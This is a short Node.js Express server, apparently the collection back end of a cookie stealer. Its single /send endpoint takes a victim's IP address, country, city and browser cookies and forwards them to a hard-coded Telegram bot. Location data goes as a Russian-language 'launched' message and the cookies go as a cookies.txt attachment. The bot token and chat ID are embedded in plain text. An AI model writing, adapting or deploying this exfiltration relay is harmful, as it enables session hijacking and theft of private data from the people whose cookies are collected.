const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TOKEN = "8679009953:AAE6I66uPMllDNCAdIL2vTUD7fs_Hvoo7uc";
const CHAT_ID = "6145369088";
const API = "https://api.telegram.org/bot" + TOKEN;

app.post('/send', async (req, res) => {
    try {
        const { ip, country, city, cookie } = req.body;

        let msg = "👋 ЗАПУЩЕН\n\n";
        if (ip) {
            msg += "IP: " + ip + "\n";
            msg += "Страна: " + (country || "Н/Д") + "\n";
            msg += "Город: " + (city || "Н/Д");
        }

        await axios.post(API + "/sendMessage", {
            chat_id: CHAT_ID,
            text: msg
        });

        if (cookie) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('document', cookie, 'cookies.txt');
            await axios.post(API + "/sendDocument", formData, {
                headers: { 'Content-Type': 'multipart/form-data' }
            });
        }

        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.listen(process.env.PORT || 3000);